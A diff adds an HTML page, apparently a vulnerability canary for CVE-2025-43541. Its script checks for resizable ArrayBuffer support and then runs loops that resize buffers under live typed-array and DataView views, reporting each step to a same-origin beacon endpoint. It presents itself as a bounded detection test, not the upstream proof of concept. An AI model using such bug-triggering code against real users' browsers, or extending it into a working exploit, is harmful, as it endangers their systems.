@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>V970B</title></head>
+<body><pre id="out">V970B — canary CVE-2025-43541 (301257) / RAB gate (B, low-cost)</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+var RUN='r'+Date.now().toString(36)+Math.random().toString(36).slice(2,6);
+function say(s){O.textContent+='\n'+s;}
+function bk(tag,body){try{new Image().src='/beacon/V970B-'+tag+'?d='+encodeURIComponent(String(body==null?'':body).slice(0,700))+'&run='+encodeURIComponent(RUN)+'&t='+Date.now()+'&s=1';}catch(e){}}
+window.onerror=function(msg,src,line){ bk('ERR','onerror:'+String(msg)+'@'+line); return false; };
+
+bk('BOOT','V970B canary CVE-2025-43541/301257: RAB gate -> bounded RAB/resize/DataView pressure; run='+RUN);
+
+// A: RAB gate
+var RAB=false;
+(function(){
+  bk('A-PRE','RAB gate');
+  try{
+    var ab=new ArrayBuffer(16,{maxByteLength:64});
+    bk('A-CTOR','ok|bl='+ab.byteLength+'|mbl='+ab.maxByteLength+'|resizable='+ab.resizable);
+    ab.resize(32);
+    bk('A-RESIZE','ok|bl='+ab.byteLength);
+    ab.resize(8);
+    bk('A-SHRINK','ok|bl='+ab.byteLength);
+    RAB=true;
+  }catch(e){ bk('A-EX',String(e&&e.name)+':'+String(e).slice(0,160)); RAB=false; }
+  // capability hints
+  try{ bk('A-CAP','transfer='+ (typeof ArrayBuffer.prototype.transfer==='function'?'1':'0') + '|resize='+(typeof ArrayBuffer.prototype.resize==='function'?'1':'0')); }catch(e){}
+})();
+
+if(!RAB){
+  bk('DONE','RAB unavailable -> canary 43541 path (as described) not testable; STOP');
+  say('done (no RAB) run='+RUN);
+} else {
+  // B: bounded canary attempts (single-thread; NOT the exact upstream PoC, mechanism-inspired)
+  bk('B-PRE','bounded RAB pressure (mechanism-inspired, not upstream PoC)');
+  // B1: TypedArray views over RAB + resize + access
+  try{
+    bk('B1-PRE','TA+resize loop');
+    for(var i=0;i<120;i++){
+      var rab=new ArrayBuffer(64,{maxByteLength:1024});
+      var u8=new Uint8Array(rab);
+      var i32=new Int32Array(rab);
+      var dv=new DataView(rab);
+      u8[0]=i&255; i32[0]=0x11223344;
+      rab.resize(128);
+      try{ u8[0]=i; dv.setUint8(16,i&255); }catch(e){}
+      rab.resize(32);
+      try{ dv.getUint8(0); }catch(e){}
+      rab.resize(256);
+      try{ i32[0]=i; }catch(e){}
+    }
+    bk('B1-OK','120 iters');
+  }catch(e){ bk('B1-EX',String(e&&e.name)+':'+String(e).slice(0,140)); }
+  // B2: DataView with changing offsets after resize (manual offset pressure)
+  try{
+    bk('B2-PRE','DV offset pressure');
+    for(var i=0;i<150;i++){
+      var rab=new ArrayBuffer(32,{maxByteLength:512});
+      var dv=new DataView(rab);
+      dv.setUint32(0,0x41424344,true);
+      for(var j=0;j<8;j++){
+        var sz=32 + ((i+j)*8)%480;
+        rab.resize(sz);
+        try{ if(sz>=4) dv.setUint32((j*4) % Math.max(4,sz-3), i+j, true); }catch(e){}
+        try{ if(sz>=4) dv.getUint32(0,true); }catch(e){}
+      }
+      rab.resize(16);
+    }
+    bk('B2-OK','150 outer');
+  }catch(e){ bk('B2-EX',String(e&&e.name)+':'+String(e).slice(0,140)); }
+  // B3: mixed TA kinds + resize
+  try{
+    bk('B3-PRE','mixed TA kinds');
+    var keep=[];
+    for(var i=0;i<80;i++){
+      var rab=new ArrayBuffer(80,{maxByteLength:2048});
+      keep.push(new Uint8Array(rab), new Uint16Array(rab), new Uint32Array(rab), new Float64Array(rab), new DataView(rab));
+      rab.resize(1024);
+      rab.resize(24);
+      rab.resize(512);
+      if(keep.length>60) keep.splice(0,20);
+    }
+    bk('B3-OK','80 iters keep='+keep.length);
+  }catch(e){ bk('B3-EX',String(e&&e.name)+':'+String(e).slice(0,140)); }
+  // B4: resize to max/min boundaries
+  try{
+    bk('B4-PRE','resize boundaries');
+    for(var i=0;i<60;i++){
+      var rab=new ArrayBuffer(8,{maxByteLength:256});
+      var u8=new Uint8Array(rab);
+      rab.resize(256); u8[255]=7;
+      rab.resize(0);
+      rab.resize(1); try{u8[0]=9;}catch(e){}
+      rab.resize(256);
+    }
+    bk('B4-OK','60 iters');
+  }catch(e){ bk('B4-EX',String(e&&e.name)+':'+String(e).slice(0,140)); }
+  bk('DONE','RAB canary (bounded, mechanism-inspired) complete; no-crash here != 43541 absent. For exact PoC behavior use upstream 301257/crypt0bit steps adapted safely.');
+  say('done run='+RUN);
+}
+</script>
+</body></html>
